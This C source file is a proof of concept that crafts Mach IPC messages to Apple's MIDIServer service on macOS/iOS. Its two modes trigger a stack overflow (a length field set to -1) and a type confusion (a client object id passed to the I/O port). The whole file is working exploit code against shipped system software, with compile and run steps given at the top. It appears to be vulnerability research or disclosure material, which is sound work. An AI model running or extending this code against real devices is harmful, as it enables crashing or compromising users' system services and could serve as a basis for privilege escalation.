/*
 * Brief: Stack overflow and type confusion in MIDIServer on macOS/iOS.
 * Author: @realBrightiup
 *
 * Follow steps below to reproduce the issues.
 * Repro:
 *     1. clang MIDIServer.c -o midi (Compile the PoC)
 *     2. ./midi tc                  (Trigger type confusion)
 *     3. ./midi overflow            (Trigger stack overflow)
 */

#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>

extern kern_return_t bootstrap_look_up(mach_port_t, const char *, mach_port_t *);

kern_return_t fetch_mach_service_port(const char *service_name, mach_port_name_t *service_port) {

    mach_port_t bs_port = MACH_PORT_NULL;

    kern_return_t kr = task_get_bootstrap_port(mach_task_self(), &bs_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] Get bootstrap port failed: %s\n", mach_error_string(kr));
        return 0;
    }

    kr = bootstrap_look_up(bs_port, service_name, service_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] bootstrap_look_up %s failed: %s\n", service_name, mach_error_string(kr));
    }
    return kr;
}

mach_msg_return_t midiserver_io(mach_port_t service_port, uint32_t object, uint32_t overflow) {

    typedef struct {
        mach_msg_header_t header;
        int32_t data[4];
    } io_message_t;

    io_message_t io;
    memset(&io, 0, sizeof(io));
    io.header.msgh_bits = MACH_MSGH_BITS(19, 0);
    io.header.msgh_size = sizeof(io);
    io.header.msgh_remote_port = service_port;
    io.header.msgh_local_port = 0;
    io.header.msgh_voucher_port = 0;
    io.header.msgh_id = 0xdead;

    io.data[0] = 0x01010101;
    io.data[1] = 2;
    if (overflow)
        io.data[2] = -1;
    else
        io.data[2] = 4;

    io.data[3] = object;
    mach_msg_return_t msg_result;
    msg_result = mach_msg(&io.header, MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
                          (mach_msg_size_t)sizeof(io), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    return msg_result;
}

mach_msg_return_t midi_register_process(mach_port_t service_port) {

#pragma pack(4)
    typedef struct {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port[2];
        NDR_record_t NDR;
        uint32_t status;
    } register_process_request_t;
#pragma pack()

#pragma pack(4)
    typedef struct {
        mach_msg_header_t header;
        NDR_record_t NDR;
        kern_return_t ret_code;
        mach_msg_trailer_t trailer;
    } register_process_reply_t;
#pragma pack()

    union {
        register_process_request_t request;
        register_process_reply_t reply;
    } message;

    memset(&message, 0, sizeof(message));

    register_process_request_t *request = &message.request;
    register_process_reply_t *reply = &message.reply;

    mach_port_t port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);

    request->header.msgh_bits =
        MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;
    request->header.msgh_size = sizeof(register_process_request_t);
    request->header.msgh_remote_port = service_port;
    request->header.msgh_local_port = mig_get_reply_port();
    request->header.msgh_voucher_port = 0x00;
    request->header.msgh_id = 8000;

    request->msgh_body.msgh_descriptor_count = 2;
    request->NDR = NDR_record;

    request->status = 1;

    request->port[0].disposition = MACH_MSG_TYPE_MAKE_SEND;
    request->port[0].name = port;
    request->port[0].type = MACH_MSG_PORT_DESCRIPTOR;
    request->port[1].disposition = MACH_MSG_TYPE_MAKE_SEND;
    request->port[1].name = port;
    request->port[1].type = MACH_MSG_PORT_DESCRIPTOR;

    mach_msg_return_t msg_result;
    msg_result = mach_msg(&request->header, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE,
                          (mach_msg_size_t)sizeof(register_process_request_t),
                          (mach_msg_size_t)sizeof(register_process_reply_t),
                          request->header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if (msg_result != KERN_SUCCESS) {
        printf("[-] send message failed: %s\n", mach_error_string(msg_result));
        return 0;
    }
    printf("[*] %s 0x%x %s\n", __func__, reply->ret_code, mach_error_string(reply->ret_code));
    return msg_result;
}

mach_msg_return_t midi_client_create(mach_port_t service_port, uint32_t *object_id) {

#pragma pack(4)
    typedef struct {
        mach_msg_header_t header;
        NDR_record_t NDR;
        uint32_t length;
        char data[0x40];
    } client_create_request_t;
#pragma pack()

#pragma pack(4)
    typedef struct {
        mach_msg_header_t header;
        NDR_record_t NDR;
        kern_return_t ret_code;
        uint32_t object;
        mach_msg_trailer_t trailer;
    } client_create_reply_t;
#pragma pack()

    union {
        client_create_request_t request;
        client_create_reply_t reply;
    } message;

    memset(&message, 0, sizeof(message));

    client_create_request_t *request = &message.request;
    client_create_reply_t *reply = &message.reply;

    request->header.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    request->header.msgh_size = sizeof(client_create_request_t);
    request->header.msgh_remote_port = service_port;
    request->header.msgh_local_port = mig_get_reply_port();
    request->header.msgh_voucher_port = 0x00;
    request->header.msgh_id = 8002;

    request->NDR = NDR_record;
    request->length = 0x40;
    memset(request->data, 'a', 0x40);

    mach_msg_return_t msg_result;
    msg_result = mach_msg(&request->header, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE,
                          (mach_msg_size_t)sizeof(client_create_request_t),
                          (mach_msg_size_t)sizeof(client_create_reply_t),
                          request->header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if (msg_result != KERN_SUCCESS) {
        printf("[-] send message failed: %s\n", mach_error_string(msg_result));
        return 0;
    }
    *object_id = reply->object;
    printf("[*] %s object = 0x%x 0x%x %s\n", __func__, *object_id, reply->ret_code,
           mach_error_string(reply->ret_code));
    return msg_result;
}

void type_confusion() {

    kern_return_t kr = KERN_SUCCESS;

    mach_port_t midi_service_port = MACH_PORT_NULL;
    kr = fetch_mach_service_port("com.apple.midiserver", &midi_service_port);
    if (kr != KERN_SUCCESS) {
        return;
    }
    midi_register_process(midi_service_port);

    mach_port_t midi_io_service_port = MACH_PORT_NULL;
    kr = fetch_mach_service_port("com.apple.midiserver.io", &midi_io_service_port);
    if (kr != KERN_SUCCESS) {
        return;
    }

    uint32_t midi_client = 0;
    midi_client_create(midi_service_port, &midi_client);

    midiserver_io(midi_io_service_port, midi_client, 0);
}

void stack_overflow() {

    kern_return_t kr = KERN_SUCCESS;

    mach_port_t midi_service_port = MACH_PORT_NULL;
    kr = fetch_mach_service_port("com.apple.midiserver", &midi_service_port);
    if (kr != KERN_SUCCESS) {
        return;
    }
    midi_register_process(midi_service_port);

    mach_port_t midi_io_service_port = MACH_PORT_NULL;
    kr = fetch_mach_service_port("com.apple.midiserver.io", &midi_io_service_port);
    if (kr != KERN_SUCCESS) {
        return;
    }

    midiserver_io(midi_io_service_port, 0, 1);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf(
            "Usage: midi <overflow|tc>\n"
            "       overflow: Stack overflow\n"
            "       tc: Type confusion\n");
        return 0;
    }

    if (!strcmp("overflow", argv[1])) {
        stack_overflow();
    } else if (!strcmp("tc", argv[1])) {
        type_confusion();
    } else {
        printf(
            "Usage: midi <overflow|tc>\n"
            "       overflow: Stack overflow\n"
            "       tc: Type confusion\n");
    }
    return 0;
}
